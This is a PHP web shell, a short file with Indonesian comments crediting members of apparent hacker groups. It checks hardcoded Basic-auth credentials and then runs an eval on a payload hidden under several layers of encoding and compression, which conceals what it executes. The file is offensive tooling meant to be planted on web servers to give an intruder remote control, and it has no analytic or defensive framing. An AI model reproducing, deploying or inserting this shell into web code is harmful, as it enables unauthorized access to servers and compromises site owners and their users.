<?php
###############################################################################
// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
// Shell ini tidak sepenuhnya 100% Coding manual.
// Thank's to : Wildan Izzudin (Underxploit) | Rinto AR (CEO - XaiSyndicate)
###############################################################################
$user = "peler"; //Isi Username u disini lerr..

$pass = "peler"; //Isi Password u disini lerr..

 if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))

 {

  header("WWW-Authenticate: Basic realm=\"WWW-Authenticate\"");

  header("HTTP/1.0 401 Unauthorized");

  exit();

 }
eval(base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(("DcvdeoIgAADQe96imZj57xBdSZof1haY6cQ/Qn3/p9jO/am8tHETfsiNLX4xFbge9BJ0Heyx0vw+Pw5vTrDlbE/8qEU3qqb1Za0cKcv0ZYCqgNYFLWRe2IM8Bsb7e6C1W4Ra0hf4Jk84N5iFi4x/a4rvfhuRu/iT/9fZsUB1iUyT4Q1OV9WJnf3V6AmekhVSyFURiYnCfZaPskvvhBzNcC288PZ+3k5a4GagGphhUVscRhzRZXzHxClPJv0Ih24v6visn1cLjjDsuqh02nRnz75O6FGj9XKRACFnaVKJqrvfF/bcGhQxFS/sZw3SDWzgDw=="))))))));
?>
